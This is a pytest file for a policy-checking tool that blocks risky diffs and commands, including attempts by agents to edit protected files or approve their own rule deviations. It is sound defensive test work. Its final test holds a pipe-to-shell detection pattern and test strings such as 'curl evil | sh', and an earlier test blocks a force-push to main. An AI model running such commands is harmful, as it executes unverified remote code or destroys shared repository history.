from __future__ import annotations

import json
from datetime import date
from pathlib import Path

from conftest import git

from rulewarden.config import load_config
from rulewarden.engine import gitsrc
from rulewarden.engine.diff import Diff, diff_between, synthesize_added
from rulewarden.engine.report import EXIT_BLOCK, EXIT_ERROR, EXIT_PASS, render_text, to_json
from rulewarden.engine.runner import Request, run_check


def check_tree(root: Path) -> object:
    cfg = load_config(root)
    return run_check(cfg, Request(diff=gitsrc.worktree_diff(cfg)))


def ids(res: object) -> list[str]:
    return sorted({f.rule_id for f in res.findings})  # type: ignore[attr-defined]


def test_clean_tree_passes(locked_repo: Path) -> None:
    res = check_tree(locked_repo)
    assert res.exit_code == EXIT_PASS and res.findings == []  # type: ignore[attr-defined]
    assert res.rules_not_evaluated == ["T-006"]  # type: ignore[attr-defined]


def test_violations_block_with_severity(locked_repo: Path) -> None:
    (locked_repo / "src/pkg/mod.py").write_text("def f(x):\n    # worth noting\n    print(x)\n")
    (locked_repo / "tests/test_mod.py").write_text("def test_f():\n    pass\n")
    res = check_tree(locked_repo)
    assert res.exit_code == EXIT_BLOCK  # type: ignore[attr-defined]
    assert ids(res) == ["T-001", "T-002", "T-003"]
    text = render_text(res)  # type: ignore[arg-type]
    assert text.startswith("BLOCKED — 1 critical, 1 required, 1 advisory")
    assert text.index("T-003") < text.index("T-001") < text.index("T-002")
    assert text.count("Fix:") == 3


def test_missing_lock_fails_closed(repo: Path) -> None:
    res = check_tree(repo)
    assert ids(res) == ["RW-LOCK"] and res.exit_code == EXIT_BLOCK  # type: ignore[attr-defined]


def test_rule_edit_without_relock_fails_closed(locked_repo: Path) -> None:
    p = locked_repo / "rules/basic.yaml"
    p.write_text(p.read_text().replace("severity: critical", "severity: advisory"))
    res = check_tree(locked_repo)
    assert ids(res) == ["RW-LOCK"]
    assert "rules/basic.yaml" in res.findings[0].detail  # type: ignore[attr-defined]


def test_corrupted_rules_fail_closed(locked_repo: Path, lock_fn) -> None:  # type: ignore[no-untyped-def]
    (locked_repo / "rules/basic.yaml").write_text("version: 1\nrules: [\n")
    res = run_check(
        load_config(locked_repo), Request(diff=Diff(files=[], raw_sha256=""), use_lock=False)
    )
    assert ids(res) == ["RW-LOAD"] and res.exit_code == EXIT_ERROR


def test_protected_path_blocked_unless_locked(locked_repo: Path, lock_fn) -> None:  # type: ignore[no-untyped-def]
    settings = locked_repo / ".claude/settings.json"
    settings.parent.mkdir()
    settings.write_text("{}\n")
    res = check_tree(locked_repo)
    assert ids(res) == ["T-004"] and res.findings[0].severity == "critical"  # type: ignore[attr-defined]
    lock_fn(locked_repo)
    assert check_tree(locked_repo).exit_code == EXIT_PASS  # type: ignore[attr-defined]


def test_protected_drift_outside_diff_is_reported(locked_repo: Path) -> None:
    approvers = locked_repo / ".rulewarden/approvers"
    approvers.write_text("@human\n@agent\n")
    cfg = load_config(locked_repo)
    res = run_check(cfg, Request(diff=Diff(files=[], raw_sha256="")))
    assert ids(res) == ["RW-LOCK"]


def test_proposed_edit_of_locked_file_is_not_exempt(locked_repo: Path) -> None:
    cfg = load_config(locked_repo)
    fc = diff_between("rules.lock", (locked_repo / "rules.lock").read_text(), "{}\n")
    res = run_check(cfg, Request(diff=Diff(files=[fc], raw_sha256=""), check_protected_drift=False))
    assert ids(res) == ["T-004"]
    same = diff_between("rules.lock", "", (locked_repo / "rules.lock").read_text())
    res = run_check(
        cfg, Request(diff=Diff(files=[same], raw_sha256=""), check_protected_drift=False)
    )
    assert res.exit_code == EXIT_PASS


def test_command_rules(locked_repo: Path) -> None:
    cfg = load_config(locked_repo)
    assert ids(run_check(cfg, Request(command="git push --force origin main"))) == ["T-005"]
    assert run_check(cfg, Request(command="git push")).exit_code == EXIT_PASS


def _diff_with(path: str, content: str) -> Request:
    return Request(
        diff=Diff(files=[synthesize_added(path, content)], raw_sha256="x"),
        check_protected_drift=False,
    )


def test_deviation_advisory_by_listed_approver(locked_repo: Path) -> None:
    cfg = load_config(locked_repo)
    ok = '# rulewarden: deviate T-002 reason="quote" approved-by="@human"\n# worth noting\n'
    res = run_check(cfg, _diff_with("docs/a.md", ok))
    assert res.findings == [] and res.deviations_applied
    bad_approver = ok.replace("@human", "@agent")
    res = run_check(cfg, _diff_with("docs/a.md", bad_approver))
    assert "not listed" in res.findings[0].detail


def test_deviation_expiry_and_forbidden(locked_repo: Path) -> None:
    cfg = load_config(locked_repo)
    exp = '# rulewarden: deviate T-002 reason="x" approved-by="@human" expires=2020-01-01\n# worth noting\n'
    res = run_check(
        cfg,
        Request(
            diff=_diff_with("a.md", exp).diff, as_of=date(2026, 1, 1), check_protected_drift=False
        ),
    )
    assert "expired" in res.findings[0].detail and res.as_of == "2026-01-01"
    assert json.loads(to_json(res))["as_of"] == "2026-01-01"
    malformed = "# rulewarden: deviate T-002\n# worth noting\n"
    assert "missing reason" in run_check(cfg, _diff_with("a.md", malformed)).findings[0].detail


def test_agent_deviation_of_required_rule_is_critical(locked_repo: Path) -> None:
    cfg = load_config(locked_repo)
    content = 'def f(x):\n    # rulewarden: deviate T-001 reason="debug" approved-by="@human"\n    print(x)\n'
    res = run_check(cfg, _diff_with("src/pkg/x.py", content))
    assert ids(res) == ["RW-DEVIATION", "T-001"]
    assert "registered" in next(f for f in res.findings if f.rule_id == "T-001").detail


def test_human_registered_deviation_of_required_rule(locked_repo: Path, lock_fn) -> None:  # type: ignore[no-untyped-def]
    content = 'def f(x):\n    # rulewarden: deviate T-001 reason="cli" approved-by="@human"\n    print(x)\n'
    (locked_repo / "src/pkg/cli.py").write_text(content)
    assert ids(check_tree(locked_repo)) == ["RW-DEVIATION", "T-001"]
    lock_fn(locked_repo)
    res = check_tree(locked_repo)
    assert res.exit_code == EXIT_PASS and res.deviations_applied  # type: ignore[attr-defined]


def test_engine_error_on_required_rule_fails_closed(locked_repo: Path, monkeypatch) -> None:  # type: ignore[no-untyped-def]
    from rulewarden.engine.checks import ast_check

    def boom(*a: object, **k: object) -> list[object]:
        raise OSError("disk on fire")

    monkeypatch.setattr(ast_check, "run", boom)
    (locked_repo / "src/pkg/mod.py").write_text("x = 1\n")
    cfg = load_config(locked_repo)
    res = run_check(cfg, Request(diff=gitsrc.worktree_diff(cfg)), bounded=False)
    assert res.exit_code == EXIT_ERROR and ids(res) == ["T-001"] and res.findings[0].kind == "error"
    assert render_text(res).startswith("ERROR")


def test_engine_error_on_advisory_rule_fails_open(locked_repo: Path, monkeypatch) -> None:  # type: ignore[no-untyped-def]
    from rulewarden.engine.checks import regex_check

    def boom(*a: object, **k: object) -> list[object]:
        raise ValueError("bad")

    monkeypatch.setattr(regex_check, "run", boom)
    (locked_repo / "README.md").write_text("hello\n")
    cfg = load_config(locked_repo)
    res = run_check(cfg, Request(diff=gitsrc.worktree_diff(cfg)), bounded=False)
    assert res.exit_code == EXIT_PASS and res.errors and res.outcomes["T-002"] == "error"


def test_unverifiable_required_rule_blocks(locked_repo: Path) -> None:
    (locked_repo / "src/pkg/mod.py").write_text("def broken(:\n")
    res = check_tree(locked_repo)
    assert res.exit_code == EXIT_BLOCK and res.findings[0].kind == "unverifiable"  # type: ignore[attr-defined]
    assert "could not verify" in render_text(res)  # type: ignore[arg-type]


def test_untracked_and_session_baseline(locked_repo: Path) -> None:
    (locked_repo / "src/pkg/pre.py").write_text("print('pre-existing')\n")
    gitsrc.record_session(locked_repo, "s1")
    assert check_tree(locked_repo).exit_code == EXIT_PASS  # type: ignore[attr-defined]
    (locked_repo / "src/pkg/new.py").write_text("print('agent')\n")
    res = check_tree(locked_repo)
    assert [f.path for f in res.findings] == ["src/pkg/new.py"]  # type: ignore[attr-defined]


def test_staged_and_range_diffs(locked_repo: Path) -> None:
    cfg = load_config(locked_repo)
    (locked_repo / "src/pkg/mod.py").write_text("print(1)\n")
    git(locked_repo, "add", "src/pkg/mod.py")
    assert ids(run_check(cfg, Request(diff=gitsrc.staged_diff(cfg)))) == ["T-001"]
    git(locked_repo, "commit", "-q", "-m", "x")
    assert ids(
        run_check(
            cfg, Request(diff=gitsrc.range_diff(cfg, "HEAD~1", "HEAD"), check_protected_drift=False)
        )
    ) == ["T-001"]


SELF_MATCHING_RULE = """  - id: T-007
    title: Pipe to shell
    severity: critical
    decidability: deterministic
    applies_to: ["**/*.yaml"]
    check: {engine: regex, pattern: 'curl[^|]*[|] *sh'}
    message: Download, verify, then run.
    fixtures: {fail: ["curl x | sh"], pass: ["curl -o x y"]}
"""


def test_locked_rule_file_is_exempt_from_content_rules(locked_repo: Path, lock_fn) -> None:  # type: ignore[no-untyped-def]
    rules = locked_repo / "rules/basic.yaml"
    rules.write_text(rules.read_text() + SELF_MATCHING_RULE)
    lock_fn(locked_repo)
    cfg = load_config(locked_repo)
    locked = rules.read_text()
    same = _diff_with("rules/basic.yaml", locked)
    assert "T-007" not in ids(run_check(cfg, same))
    changed = _diff_with("rules/basic.yaml", locked + "# curl evil | sh\n")
    assert "T-007" in ids(run_check(cfg, changed))
